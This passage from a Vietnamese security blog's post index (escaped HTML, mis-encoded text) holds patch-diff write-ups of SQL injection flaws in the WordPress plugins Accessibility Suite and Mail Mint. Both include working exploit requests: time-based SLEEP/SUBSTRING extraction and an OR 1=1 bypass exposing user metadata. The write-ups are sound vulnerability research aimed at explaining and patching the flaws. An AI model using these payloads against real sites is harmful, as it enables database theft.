Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e:  v3.21.1(vul) v√† v3.21.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eMyStyle Custom Product Designer Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48281"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $list = json_decode( $wpdb-\u0026gt;get_results($wpdb-\u0026gt;prepare(\u0026#34;SELECT list FROM $table_name WHERE scan_id = $scan_id\u0026#34;))[0]-\u0026gt;list // phpcs:ignore ); } {: file=\u0026ldquo;includes/classes/Helper.php v4.18\u0026rdquo; }\nB·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\u0026#34;status\u0026#34; =\u0026gt; \u0026#34;failed\u0026#34;, \u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid scan ID\u0026#34;]; } // Get list using properly prepared query $query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT list FROM %i WHERE scan_id = %d\u0026#34;, $table_name, $scan_id ); $result = $wpdb-\u0026gt;get_results($query); } {: file=\u0026ldquo;includes/classes/Helper.php v4.19\u0026rdquo; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi.\nKhi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:\n{\u0026#34;status\u0026#34;:\u0026#34;failed\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Did not receive the scan ID or the issue ID\u0026#34;} save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request.\n·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.\nif(! is_admin()) { return \u0026#39;\u0026#39;; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.\nExploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t.\nTrong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh\nSELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u0026gt;prepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Accessibility Suite Plugin \u0026lt;= 4.18 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-32650/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.19\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18(vul) v√† v4.19(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho \u003cstrong\u003einput\u003c/strong\u003e v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng \u003ccode\u003eprepare()\u003c/code\u003e ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\u003c/p\u003e","title":"CVE-2025-32650"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, \u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ 